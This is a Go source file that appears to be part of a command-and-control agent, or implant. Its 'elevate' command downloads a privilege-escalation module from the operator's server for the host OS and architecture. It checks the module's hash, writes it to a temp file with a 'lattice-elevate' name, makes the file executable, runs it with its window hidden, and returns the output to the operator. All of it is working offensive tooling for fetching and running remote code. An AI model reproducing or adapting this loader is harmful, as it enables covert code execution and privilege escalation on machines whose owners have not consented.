package runtime

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"

)

func (a *Agent) runElevate(ctx context.Context, taskID string, args []string) (int32, string, string) {
	if len(args) == 0 || strings.TrimSpace(args[0]) == "" {
		return 1, "", "usage: elevate <module-name> [args…]"
	}
	if a.Transport == nil {
		return 1, "", "no transport"
	}
	name := strings.ToLower(strings.TrimSpace(args[0]))
	extra := args[1:]

	dlCtx, cancel := context.WithTimeout(context.Background(), 5*time.Minute)
	defer cancel()
	dl, err := a.Transport.DownloadModule(dlCtx, a.ID, "elevate", name, runtime.GOOS, runtime.GOARCH, "")
	if err != nil {
		return 1, "", "module download failed: " + err.Error()
	}
	mod := dl.GetModule()
	data := dl.GetData()
	if mod == nil || len(data) == 0 {
		return 1, "", "empty module payload"
	}
	sum := sha256.Sum256(data)
	if !strings.EqualFold(hex.EncodeToString(sum[:]), mod.GetSha256()) {
		return 1, "", "module sha256 mismatch"
	}

	runArgs := append([]string{}, mod.GetDefaultArgs()...)
	runArgs = append(runArgs, extra...)

	tmp, err := writeModuleTemp(data, runtime.GOOS)
	if err != nil {
		return 1, "", err.Error()
	}
	defer os.Remove(tmp)

	// Reuse shell cancel/timeout machinery by executing directly with cwd + cancel poll.
	runCtx, runCancel := context.WithTimeout(ctx, shellTimeout)
	defer runCancel()
	if a.Transport != nil && taskID != "" {
		if cancelled, err := a.Transport.MarkRunning(ctx, a.ID, taskID); err == nil && cancelled {
			return 130, "", "cancelled by operator"
		}
		stopPoll := make(chan struct{})
		defer close(stopPoll)
		go func() {
			ticker := time.NewTicker(400 * time.Millisecond)
			defer ticker.Stop()
			for {
				select {
				case <-stopPoll:
					return
				case <-runCtx.Done():
					return
				case <-ticker.C:
					pollCtx, pollCancel := context.WithTimeout(context.Background(), 2*time.Second)
					cancelled, pollErr := a.Transport.PollCancel(pollCtx, a.ID, taskID)
					pollCancel()
					if pollErr == nil && cancelled {
						runCancel()
						return
					}
				}
			}
		}()
	}

	cmd := exec.CommandContext(runCtx, tmp, runArgs...)
	a.ensureCwd()
	cmd.Dir = a.Cwd
	hideWindow(cmd)
	out, err := cmd.CombinedOutput()
	text := truncateOutput(string(out))
	if err == nil {
		return 0, text, ""
	}
	if runCtx.Err() != nil {
		return 130, text, "cancelled or timed out"
	}
	if ee, ok := err.(*exec.ExitError); ok {
		return int32(ee.ExitCode()), text, ""
	}
	return 1, text, err.Error()
}

func writeModuleTemp(data []byte, goos string) (string, error) {
	pattern := "lattice-elevate-*"
	if goos == "windows" {
		pattern = "lattice-elevate-*.exe"
	}
	f, err := os.CreateTemp("", pattern)
	if err != nil {
		return "", err
	}
	defer f.Close()
	if _, err := f.Write(data); err != nil {
		_ = os.Remove(f.Name())
		return "", err
	}
	name := f.Name()
	_ = f.Chmod(0o755)
	// Ensure Windows temp name ends with .exe when pattern lacked it on older Go.
	if goos == "windows" && !strings.HasSuffix(strings.ToLower(name), ".exe") {
		next := name + ".exe"
		if err := os.Rename(name, next); err != nil {
			_ = os.Remove(name)
			return "", err
		}
		name = next
	}
	_ = filepath.Clean(name)
	return name, nil
}
